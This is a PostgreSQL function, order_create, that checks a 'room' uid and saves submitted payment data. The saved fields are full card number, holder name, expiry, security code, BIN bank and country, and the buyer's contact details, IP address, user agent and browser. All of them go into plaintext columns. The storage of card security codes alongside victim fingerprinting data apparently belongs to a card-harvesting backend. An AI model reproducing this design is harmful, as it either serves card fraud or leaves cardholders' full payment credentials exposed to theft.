CREATE OR REPLACE FUNCTION order_create(jsu json, jsb json)
	RETURNS boolean
	LANGUAGE plpgsql
AS $function$
DECLARE
	_r rooms;
BEGIN
	SELECT *
	FROM rooms
	WHERE uid_room = jsu->>'uidRoom'
	INTO _r;

	IF _r.id ISNULL THEN
		RAISE EXCEPTION 'комната с таким uid не существует';
	END IF;

	INSERT INTO orders(uid_order) VALUES(jsu->>'uidRoom');
	INSERT INTO order_data(
		uid_order,
		bin_brand,
		bin_type,
		bin_bank,
		bin_country,
		name,
		mobile,
		address,
		price,
		card_number,
		card_holder_name,
		exp_month,
		exp_year,
		security_code,
		user_agent,
		ip_address,
		current_url,
		lang,
		operating_system,
		browser
	) VALUES(
		jsu->>'uidRoom',
		jsb->>'brand',
		jsb->>'type',
		jsb->>'bin_bank',
		jsb->>'country',
		jsu->>'name',
		jsu->>'mobile',
		jsu->>'address',
		jsu->>'price',
		jsu->>'card_number',
		jsu->>'card_holder_name',
		jsu->>'expiry_month',
		jsu->>'expiry_year',
		jsu->>'security_code',
		jsu->>'user_agent',
		jsu->>'ip_address',
		jsu->>'current_url',
		jsu->>'language',
		jsu->>'operating_system',
		jsu->>'browser'
	);

	RETURN TRUE;
END;
$function$